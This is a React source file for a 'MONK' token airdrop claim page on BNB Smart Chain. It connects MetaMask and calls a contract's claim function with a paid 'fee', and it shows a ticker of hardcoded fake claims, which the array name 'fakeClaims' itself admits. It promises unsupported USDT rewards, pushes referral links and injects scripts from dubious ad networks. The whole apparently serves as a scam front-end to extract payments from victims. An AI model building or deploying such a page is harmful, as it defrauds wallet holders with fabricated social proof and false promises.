import React, { useEffect, useState } from "react";
import { ethers } from "ethers";
import AirdropAbi from "./abi/AirdropClaimer.json";
import "./App.css";

const CONTRACT_ADDRESS = "0xfD704fdCDf772a137BAdbDE8b3f535ef9f79Be1f";

const fakeClaims = [
  "0xAb...12F3 claimed 100 MONK",
  "0x4D...91C9 claimed 100 MONK",
  "0x88...45F7 claimed 100 MONK",
  "0x1C...9D3A claimed 100 MONK",
  "0xB2...4C9F claimed 100 MONK",
  "0xEF...A712 claimed 100 MONK",
  "0x0A...B27D claimed 100 MONK",
  "0x77...E95C claimed 100 MONK",
  "0xAbC...1234 claimed 100 MONK",
  "0xDef...5678 claimed 100 MONK",
  "0x123...AbC9 claimed 100 MONK",
  "0x456...FFaa claimed 100 MONK",
  "0x789...ACD1 claimed 100 MONK"
];

function App() {
  const [account, setAccount] = useState(null);
  const [referral, setReferral] = useState(null);
  const [txStatus, setTxStatus] = useState("");
  const [showAd, setShowAd] = useState(false); // state to control ad display

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const ref = params.get("ref");
    if (ref) setReferral(ref);

    if (window.ethereum) {
      window.ethereum.on("accountsChanged", () => {
        connectWallet();
      });
    }
  }, []);

  const connectWallet = async () => {
    if (!window.ethereum) return alert("Please install MetaMask!");
    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();
    setAccount(address);

    const network = await provider.getNetwork();
    if (network.chainId !== 56) {
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }],
        });
      } catch (e) {
        alert("Please switch to BNB Smart Chain Mainnet.");
      }
    }
  };

  const claimAirdrop = async () => {
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const contract = new ethers.Contract(CONTRACT_ADDRESS, AirdropAbi, signer);

      const tx = await contract.claim(referral || ethers.ZeroAddress, {
        value: ethers.parseEther("0.0003"),
      });

      setTxStatus("Claiming...");
      await tx.wait();
      setTxStatus("✅ Claim successful!");
    } catch (err) {
      console.error(err);
      setTxStatus("❌ Already claimed or insufficient gas fee.");
    }
  };

  const referralLink = `${window.location.origin}?ref=${account}`;

  // Handle ad script insertion
  const loadMonetagAd = () => {
    setShowAd(true); // show ad container
    const script = document.createElement("script");
    script.innerHTML = `
      atOptions = {
        'key' : 'https://otieu.com/4/9681195',
        'format' : 'iframe',
        'height' : 50,
        'width' : 320,
        'params' : {}
      };
      document.write('<scr' + 'ipt src="https://www.profitabledisplaynetwork.com/ads.js"></scr' + 'ipt>');
    `;
    script.async = true;
    document.getElementById("monetag-container").appendChild(script);
  };

  return (
    <div className="page">
      <div className="ticker-wrapper">
        <div className="ticker-content">
          {fakeClaims.map((text, index) => (
            <span key={index} className="ticker-item">
              {text} 🎉
            </span>
          ))}
          {fakeClaims.map((text, index) => (
            <span key={"dup_" + index} className="ticker-item">
              {text} 🎉
            </span>
          ))}
        </div>
      </div>

      <div className="promo-section">
        <p>🚀 Want to build your own project?</p>
        <a href="https://createtokenbsc.vercel.app/" target="_blank" rel="noopener noreferrer">
          <button className="promo-btn">Build with Us</button>
        </a>
      </div>

      <div className="main-content">
        <div className="header">
          <img src="/monkey.png" alt="logo" className="logo" />
          <h1 className="main-title">$20,000 USDT Reward & $200k worth of $Monk Airdrop</h1>
        </div>

        <p className="highlight-text">💰 Top 100 referrers will receive $100 USDT each</p>
        <p className="highlight-text">🎁 1000 claimers randomly receive $10 USDT each!</p>
        <p className="highlight-text">NOTE:Only 0.0003(~0.24$) blockchain fee needed to improve the project</p>

        <div className="token-info">
          <p>FCFS: <strong>20,000 users</strong></p>
          <p>Token: <strong>$Monkey (MONK)</strong></p>
          <p>Total Supply: <strong>100 Million</strong></p>
          <p>Listing Date: <strong>19th August</strong></p>
          <p>Listing Price: <strong>$0.10</strong></p>
          <p>Referral Bonus: <strong>20 MONK per referral</strong></p>
        </div>

        {!account && (
          <button onClick={connectWallet} className="connect-btn">
            🔗 Connect & Claim Free Tokens
          </button>
        )}

        {account && (
          <>
            <button className="claim-btn" onClick={claimAirdrop}>
              🎉 Claim Free 100 MONK
            </button>

            <div className="referral">
              <p>📩 Your Referral Link:</p>
              <input type="text" value={referralLink} readOnly />
            </div>
          </>
        )}

        {txStatus && <p className="status-msg">{txStatus}</p>}

        {/* Ad Section */}
        <div className="ads-section">
          <button className="promo-btn" onClick={loadMonetagAd}>
            📢 Click to Show Ad
          </button>

          {showAd && <div id="monetag-container" style={{ marginTop: "20px" }}></div>}
        </div>
      </div>
    </div>
  );
}

export default App;
